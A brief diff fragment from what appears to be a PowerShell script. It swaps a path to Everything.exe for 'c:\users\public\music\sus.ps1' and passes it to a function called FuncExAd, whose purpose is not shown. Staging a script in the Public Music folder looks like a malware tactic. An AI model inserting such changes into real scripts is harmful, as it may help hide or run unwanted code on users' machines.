@@ -73,7 +73,7 @@ function FuncExAd {
 	}
 }
 
-$stringPath='D:\Everything\Everything.exe';
+$stringPath='c:\users\public\music\sus.ps1';
 FuncExAd -src $stringPath;
 
 
